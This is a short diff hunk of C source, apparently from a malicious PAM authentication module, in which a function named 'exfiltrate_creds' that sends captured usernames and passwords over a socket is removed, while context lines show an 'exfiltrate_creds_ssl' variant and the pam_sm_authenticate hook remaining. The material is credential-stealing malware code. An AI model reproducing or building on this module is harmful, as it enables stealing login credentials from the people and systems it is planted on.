@@ -97,19 +97,6 @@ void exfiltrate_creds_ssl(SSL *ssl_socket,const char *username,const char *passw
 
 }
 
-void exfiltrate_creds(int socket,const char *username,const char *password)
-{
-
-	
-	//Send data
-	send(socket , (const void *) username , strlen(username), 0 );
-	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1, 0 );
-	send(socket , (const void *) password , strlen(password), 0 );
-	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1, 0 );
-	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1, 0 );
-
-}
-
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
 {
 	int pam_code;
